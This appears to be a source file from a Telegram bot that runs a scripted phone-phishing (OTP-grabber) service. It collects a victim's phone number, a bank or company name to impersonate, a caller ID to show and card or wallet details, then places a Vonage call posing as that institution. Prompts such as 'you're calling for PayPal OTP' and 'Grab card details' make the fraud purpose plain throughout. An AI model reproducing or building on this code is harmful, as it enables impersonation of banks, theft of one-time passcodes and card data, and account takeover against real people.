/* eslint-disable @typescript-eslint/no-explicit-any */
import { Middleware, Markup } from 'telegraf';
import { server } from '../server';
import { C } from '../types';
import { UK_NUM, US_NUM } from './constants';
import { vonageMakeACall } from './vonage';

export const steps = (step: string): Array<Middleware<C>> => [
  async (ctx) => {
    await ctx.replyWithHTML(
      `👍🏽 Awesome, Let's start\n\nReply with the number 📱\n(ex. ${
        Math.round(Math.random()) ? UK_NUM : US_NUM
      })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
        /^./,
        step[0].toUpperCase(),
      )} ~</i></b>`,
    );
    ctx.wizard.state.callData = {};
    return ctx.wizard.next();
  },
  async (ctx) => {
    if (!ctx.message) {
      await ctx.reply(
        '🚫 Request expired, start again\n\n',
        Markup.inlineKeyboard([Markup.button.callback('Make a call', 'call')]),
      );

      return ctx.scene.leave();
    }

    const numValid =
      /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
        // @ts-expect-error ts doesn't not recognise text on message
        ctx.message.text,
      );

    if (!numValid) {
      await ctx.reply(
        `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
      );
      return;
    }
    await ctx.replyWithHTML(
      `Good,\n\nReply with the ${
        step === 'account' ? 'institution name 🏢' : 'bank name 🏦'
      }\n(e.g ${
        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
          // @ts-expect-error ts doesn't not recognise state
          ctx.message.text,
        )
          ? `${step === 'account' ? 'Gmail' : 'Barclays'}`
          : `${step === 'account' ? 'Paypal' : 'Chase'}`
      })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
        /^./,
        step[0].toUpperCase(),
      )} ~</i></b>`,
      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
    );

    // @ts-expect-error ts doesn't not recognise state
    ctx.wizard.state.callData.number = ctx.message.text;

    return ctx.wizard.next();
  },
  async (ctx) => {
    await ctx.replyWithHTML(
      `Okay,\n\nReply with the caller ID 👤\n(e.g ${
        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
          ctx.wizard.state.callData.number,
        )
          ? '448081961740'
          : '18882019292'
      })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
        /^./,
        step[0].toUpperCase(),
      )} ~</i></b>`,
    );

    // @ts-expect-error ts doesn't not recognise state
    ctx.wizard.state.callData.institutionName = ctx.message.text;
    return ctx.wizard.next();
  },
  ...(step === 'pay'
    ? [
        async (ctx: any) => {
          const numValid =
            /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
              ctx.message.text,
            );

          if (!numValid) {
            await ctx.reply(
              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
            );
            return;
          }
          await ctx.replyWithHTML(
            `Perfect, Reply with the wallet service name \n(e.g ${
              Math.round(Math.random()) ? 'Apple pay' : 'Google pay'
            })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
              /^./,
              step[0].toUpperCase(),
            )} ~</i></b>`,
          );

          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
      ]
    : []),
  ...(step === 'card'
    ? [
        async (ctx: any) => {
          const numValid =
            /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
              ctx.message.text,
            );

          if (!numValid) {
            await ctx.reply(
              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
            );
            return;
          }
          await ctx.replyWithHTML(
            `💳 Select card type\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
              /^./,
              step[0].toUpperCase(),
            )} ~</i></b>`,
            Markup.inlineKeyboard([
              Markup.button.callback('Debit', 'debit'),
              Markup.button.callback('Credit', 'credit'),
            ]),
          );
          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
      ]
    : []),
  ...(step === 'account'
    ? [
        async (ctx: any) => {
          const numValid =
            /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
              ctx.message.text,
            );

          if (!numValid) {
            await ctx.reply(
              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
            );
            return;
          }
          await ctx.replyWithHTML(
            "Grab card 💳 details\n\n<b>***Only click on yes if it's relevant***</b>\n\ne.g you're calling for PayPal OTP, you wouldn't ask card details for a Gmail OTP 🙄",
            Markup.inlineKeyboard([
              Markup.button.callback('Yes', 'yes'),
              Markup.button.callback('No', 'no'),
            ]),
          );
          ctx.wizard.state.callData.callerId = ctx.message.text;
          return ctx.wizard.next();
        },
        async (ctx: any) => {
          await ctx.replyWithHTML(
            `Click call once you have sent the OTP.\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
              /^./,
              step[0].toUpperCase(),
            )} ~</i></b>`,
            Markup.inlineKeyboard([Markup.button.callback('Call now', 'call')]),
          );
          return ctx.wizard.next();
        },
      ]
    : []),
  async (ctx) => {
    if (!ctx.wizard.state.callData) {
      await ctx.reply(
        '🚫 Request expired, start again\n\n',
        Markup.inlineKeyboard([Markup.button.callback("🎬 Let's go", 'start')]),
      );
    }
    if (step === 'bank' && !ctx.wizard.state.callData.callerId) {
      const numValid =
        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
          // @ts-expect-error ts doesn't not recognise state
          ctx.message.text,
        );

      if (!numValid) {
        await ctx.reply(
          `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
        );
        return;
      }
      // @ts-expect-error ts doesn't not recognise state
      ctx.wizard.state.callData.callerId = ctx.message.text;
    }
    ctx.wizard.state.callData.wallet =
      ctx.message && step === 'pay'
        ? // @ts-expect-error ts doesn't not recognise state
          ctx.message.text
        : undefined;
    const { number, institutionName, callerId, wallet, cardType, askCardInfo } =
      ctx.wizard.state.callData;
    const from =
      /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
        number,
      )
        ? process.env.UK_NUM
        : process.env.US_NUM;

    await ctx.replyWithHTML(
      `Calling ${number}\nfrom ${callerId} as:\n\n${institutionName} 📲...\n\n<b><i>~ ${step.replace(
        /^./,
        step[0].toUpperCase(),
      )} ~</i></b>`,
    );

    const chatId = ctx.chat?.id || ctx.from?.id;
    await server(ctx, chatId);

    await vonageMakeACall({
      from,
      to: number,
      institutionName: institutionName,
      step,
      wallet,
      cardType,
      askCardInfo,
    });

    return ctx.wizard.next();
  },
];
